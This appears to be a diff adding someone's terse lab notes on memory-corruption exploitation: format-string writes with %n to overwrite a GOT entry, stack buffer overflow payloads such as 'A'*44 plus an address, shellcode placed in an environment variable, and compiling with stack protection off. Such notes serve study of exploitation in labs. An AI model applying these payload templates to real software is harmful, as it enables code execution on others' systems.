@@ -1,0 +1,80 @@
+FORMAT STRING
+------------- 
+export EGG with $python which has 500 nops + shellcode
+
+echo $EGG
+
+objdump -R format #copy the putchar addrz
+
+gdb ./format
+disass, r
+searchmem EGG
+x/20wx $esp
+p &b
+p $ebp
+
+EGG value
+0xbffff338 +100
+
+x/10i 0xbffff439
+run with $python -c
+
+putchar addrz + 2
+-%(adrz endhalf-A)u-%4\$n
+-%(adrz endhalf-A)u-%4\$n%5\$n
+-%(adrz endhalf-A)u-%4\$n%(1bfff-adrz endhalf)u%5\$n
+
+
+
+
+Buffer OverFlow
+---------------
+METHOD 1 (using explot file)
+gdb-peda$ p &buf
+$1 = (char (*)[32]) 0xbffff0d0
+ebp-addr(buff)
+gdb-peda$ p/d 0xbffff0f8-0xbffff0d0
+$2 = 40
+
+total=40+4
+
+(python -c 'print "A"*44 + "Address"';cat)|prgm
+execute
+(python exploit.py; cat) | ./vuln
+or
+python exploit.py > badfile
+
+cat badfile - | ./vuln
+
+METHOD 2(envvrble)
+--------
+exploit
+
+export EGG=`python exploit.py`
+
+gdb
+find egg adrz
+run vuln prgm with nops and egg adrz
+
+Integer overflow
+-----------------
+
+short 0 - 65535 and -32768 - 32767
+
+gdb --args ./prog arg1 arg2
+
+gdb --args ./vuln1 $(python exploit1.py)
+
+./vuln1 $(python exploit1.py)
+
+export EGG=`python shellcode.py`
+
+gcc -ggdb -fno-stack-protector -z execstack -o vuln1 vuln1.c 
+
+
+gdb commands
+
+r `python exploit1.py`
+
+
+
